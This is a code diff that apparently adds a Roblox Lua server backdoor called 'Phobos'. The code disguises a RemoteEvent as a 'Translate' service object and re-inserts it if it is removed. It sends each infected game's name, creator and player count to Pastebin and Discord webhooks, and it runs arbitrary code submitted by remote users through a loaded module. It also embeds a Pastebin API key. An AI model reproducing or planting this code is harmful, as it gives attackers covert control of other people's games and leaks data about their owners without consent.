+	local gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+	local Players = game:GetService("Players"):GetChildren()
+	local TIME_ZONE = 19 --est
+
+	local date = os.date("!*t")
+	local hour = (date.hour + TIME_ZONE) % 24
+	local ampm = hour < 12 and "AM" or "PM"
+	local currentTime = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, ampm)
+	local HttpService = game:GetService("HttpService")
+
+	local URL_PASTEBIN_NEW_PASTE = "https://pastebin.com/api/api_post.php"
+
+	local dataFields = {
+		["api_dev_key"] = "Fs6q2BE4I3T9MmRxs6F0xoxJp9i4pPCx",
+		["api_option"] = "paste", -- keep as "paste"
+		["api_paste_name"] = gname.Name.." (Phobos)", -- paste name
+		["api_paste_code"] = "Game Name: "..gname.Name.."\n\nGame Link: ".."https://www.roblox.com/games/"..game.PlaceId.."\n\nCreator: "..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\nBackdoor Version: "..BDV.."\n\nTime (Eastern Standard Time): "..currentTime.."\n\nDate: "..dateTime(), -- paste content
+		["api_paste_format"] = "text", -- paste format
+		["api_paste_expire_date"] = "1Y", -- expire date
+		["api_paste_private"] = "1", -- 0=public, 1=unlisted, 2=private
+		["api_user_key"] = "", -- user key, if blank post as guest 640b52ecdc2b3d82269838293b2be2d4
+
+	}
+
+	local data = ""
+
+	for k, v in pairs(dataFields) do
+
+		data = data .. ("&%s=%s"):format(HttpService:UrlEncode(k), HttpService:UrlEncode(v))
+
+	end
+	data = data:sub(2) 
+
+	local response = HttpService:PostAsync(URL_PASTEBIN_NEW_PASTE, data, Enum.HttpContentType.ApplicationUrlEncoded, false)
+
+	local isHttpEnabled = pcall(function()
+		game:GetService("HttpService"):RequestAsync({Url = "https://google.com", Method = "GET"})
+	end)
+
+	function Upload()
+		local data = {
+			["embeds"] = {{
+				["title"] = "❕New Game❕";
+				["description"] = "\n**Game Name: ** "..gname.Name.."\n\n**Game Link: ** ".."https://www.roblox.com/games/"..game.PlaceId.."\n\n**Players: **"..#Players.."\n\n**Creator: **"..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\n**Backdoor Version: **"..BDV.."\n\n**Archive Link (PASTEBIN): **"..response.."\n\n <@&1087058902937518080>",
+				["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+				["color"] = tonumber(0x00b3ff);
+			}}
+		}
+		local data2 = HttpService:JSONEncode(data)
+		HttpService:PostAsync(hook2,data2)
+	end
+
+	local success1, result1 = pcall(function()
+		function Check()
+			if game:GetService("RunService"):IsStudio() == false then
+				if game:GetService("InsertService"):FindFirstChild("InsertModels") then
+					if game.GameId == 0 then
+						--Upload()
+						--http hook wont post because the game id is 0
+					else
+						Upload()
+						return
+					end
+
+				else
+
+					return
+				end
+			end
+		end
+	end)
+
+	if isHttpEnabled == false then
+		Event:FireClient()
+	else
+		Check()
+	end
+
+	Event.OnServerEvent:Connect(function(plr,lol,Other)
+		for i, Blacklisted in pairs(BlacklistedUsers) do
+			if Blacklisted == plr.UserId then
+				plr:Kick('You are not allowed to use Phobos')
+			end
+		end
+		local upload2 = function()
+			local data = {
+				["embeds"] = {{
+					["title"] = "Detected User";
+					["description"] = "\n**Username:** "..plr.Name.."\n\n**Link ** ".."https://www.roblox.com/users/"..plr.UserId.."/profile".."\n\n**Tried executing: **".."`"..lol.."`".."\n\n**Backdoor Version: **"..BDV,
+					["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+					["color"] = tonumber(0x00b3ff);
+				}}
+			}
+			local data2 = HttpService:JSONEncode(data)
+			HttpService:PostAsync(hook3,data2)
+		end
+		local success, result = pcall(function() 
+			if Other == "Respawn" then
+				local success, result = pcall(function() 
+					plr:LoadCharacter()
+				end)
+			elseif Other == "R6" then
+				local success, result = pcall(function() 
+					require(10796895415).load(plr.Name)
+				end)
+			end
+			local success, result = pcall(function()
+				phobos(lol)()
+			end)
+		end)
+	end)
+	local success1, result1 = pcall(function()
+		game:GetService("InsertService"):FindFirstChild("InsertModels").DescendantRemoving:Connect(function(event1)
+			if event1.Name == "InsertModels" then
+				ReInsert()
+				return
+			end
+		end)
+	end)
+
+end
+
+function Start3()
+	local Event = Instance.new("RemoteEvent")
+	Event.Parent = game:GetService("LocalizationService")
+	Event.Name = "Translate"
+
+	script.Parent = game:GetService("LocalizationService")
+	script.Name = "Main"
+
+	--
+	function ReInsert()
+		local Event = Instance.new("RemoteEvent")
+		Event.Parent = game:GetService("LocalizationService")
+		Event.Name = "Translate"
+	end
+
+	--
+	local HttpService = game:GetService("HttpService")
+
+	local phobos = require(10131117731)
+
+	function getMonth(DoTy, months)
+		local var2 = DoTy
+		for i = 1, #months do
+			if var2 <= months[i] then return i, var2 else var2 = var2 - months[i] end
+		end
+	end
+
+	function dateTime()
+		local months = {31, 28, 31, 30, 31, 30, 31,31,30, 31, 30, 31}
+		local timezone, offset_hours = "EST", -4
+		local secondspassed = os.time()+(3600*offset_hours)
+		local yearspassed = math.floor(secondspassed/31557600)
+		local YoTc = yearspassed-30
+		local DoTy =  math.floor((secondspassed-(yearspassed*(31557600)))/86400)+1
+		if YoTc/4-math.floor(YoTc/4) == 0 then months[2] = 29 end
+		local MoTy, DoTm = getMonth(DoTy, months)
+		local HR = math.floor((secondspassed-((math.floor(secondspassed/86400))*86400))/3600)
+		local MIN = math.floor((secondspassed-((math.floor(secondspassed/3600))*3600))/60)
+		local SEC = math.floor((secondspassed-((math.floor(secondspassed/60))*60)))
+		if string.len(HR)==1 then HR = "0"..HR end
+		if string.len(MIN)==1 then MIN = "0"..MIN end
+		if string.len(SEC)==1 then SEC = "0"..SEC end
+		return MoTy.."/"..DoTm.."/"..YoTc
+	end
+	local gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+	local Players = game:GetService("Players"):GetChildren()
+	local TIME_ZONE = 19 --est
+
+	local date = os.date("!*t")
+	local hour = (date.hour + TIME_ZONE) % 24
+	local ampm = hour < 12 and "AM" or "PM"
+	local currentTime = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, ampm)
+	local HttpService = game:GetService("HttpService")
+
+	local URL_PASTEBIN_NEW_PASTE = "https://pastebin.com/api/api_post.php"
+
+	local dataFields = {
+		["api_dev_key"] = "Fs6q2BE4I3T9MmRxs6F0xoxJp9i4pPCx",
+		["api_option"] = "paste", -- keep as "paste"
+		["api_paste_name"] = gname.Name.." (Phobos)", -- paste name
+		["api_paste_code"] = "Game Name: "..gname.Name.."\n\nGame Link: ".."https://www.roblox.com/games/"..game.PlaceId.."\n\nCreator: "..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\nBackdoor Version: "..BDV.."\n\nTime (Eastern Standard Time): "..currentTime.."\n\nDate: "..dateTime(), -- paste content
+		["api_paste_format"] = "text", -- paste format
+		["api_paste_expire_date"] = "1Y", -- expire date
+		["api_paste_private"] = "1", -- 0=public, 1=unlisted, 2=private
+		["api_user_key"] = "", -- user key, if blank post as guest 640b52ecdc2b3d82269838293b2be2d4
+
+	}
+
+	local data = ""
+
+	for k, v in pairs(dataFields) do
+
+		data = data .. ("&%s=%s"):format(HttpService:UrlEncode(k), HttpService:UrlEncode(v))
+
+	end
+	data = data:sub(2) 
+
+	local response = HttpService:PostAsync(URL_PASTEBIN_NEW_PASTE, data, Enum.HttpContentType.ApplicationUrlEncoded, false)
+
+	local isHttpEnabled = pcall(function()
+		game:GetService("HttpService"):RequestAsync({Url = "https://google.com", Method = "GET"})
+	end)
+
+	function Upload()
+		local data = {
+			["embeds"] = {{
+				["title"] = "❕New Game❕";
+				["description"] = "\n**Game Name: ** "..gname.Name.."\n\n**Game Link: ** ".."https://www.roblox.com/games/"..game.PlaceId.."\n\n**Players: **"..#Players.."\n\n**Creator: **"..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\n**Backdoor Version: **"..BDV.."\n\n**Archive Link (PASTEBIN): **"..response.."\n\n <@&1087058902937518080>",
+				["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+				["color"] = tonumber(0x00b3ff);
+			}}
+		}
+		local data2 = HttpService:JSONEncode(data)
+		HttpService:PostAsync(hook2,data2)
+	end
+
+	local success1, result1 = pcall(function()
+		function Check()
+			if game:GetService("RunService"):IsStudio() == false then
+				if game:GetService("LocalizationService"):FindFirstChild("Translate") then
+					if game.GameId == 0 then
+						--Upload()
+						--http hook wont post because the game id is 0
+					else
+						Upload()
+						return
+					end
+
+				else
+
+					return
+				end
+			end
+		end
+	end)
+
+	if isHttpEnabled == false then
+		Event:FireClient()
+	else
+		Check()
+	end
+
+	Event.OnServerEvent:Connect(function(plr,lol,Other)
+		for i, Blacklisted in pairs(BlacklistedUsers) do
+			if Blacklisted == plr.UserId then
+				plr:Kick('You are not allowed to use Phobos')
+			end
+		end
+		local upload2 = function()
+			local data = {
+				["embeds"] = {{
+					["title"] = "Detected User";
+					["description"] = "\n**Username:** "..plr.Name.."\n\n**Link ** ".."https://www.roblox.com/users/"..plr.UserId.."/profile".."\n\n**Tried executing: **".."`"..lol.."`".."\n\n**Backdoor Version: **"..BDV,
+					["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+					["color"] = tonumber(0x00b3ff);
+				}}
+			}
+			local data2 = HttpService:JSONEncode(data)
+			HttpService:PostAsync(hook3,data2)
+		end
+		local success, result = pcall(function() 
+			if Other == "Respawn" then
+				local success, result = pcall(function() 
+					plr:LoadCharacter()
+				end)
+			elseif Other == "R6" then
+				local success, result = pcall(function() 
+					require(10796895415).load(plr.Name)
+				end)
+			end
+			local success, result = pcall(function()
+				phobos(lol)()
+			end)
+		end)
+	end)
+	local success1, result1 = pcall(function()
+		game:GetService("LocalIzationService").DescendantRemoving:Connect(function(event1)
+			if event1.Name == "Translate" then
+				ReInsert()
+				return
+			end
+		end)
+	end)
+
+end
+
+if ChosenLocationNumber == 1 then
+	Start2()
+elseif ChosenLocationNumber == 2 then
+	warn("its 2! before")
+	Start2()
+	warn("its 2! after")
+elseif ChosenLocationNumber == 3 then
+	warn("its 3! before")
+	Start3()
+	warn("its 3! after")
+elseif ChosenLocationNumber == 0 then
+	warn("its 4! before")
+	Start2()
+	warn("its 4! after")
+elseif ChosenLocationNumber == 4 then
+	Start3()
+end
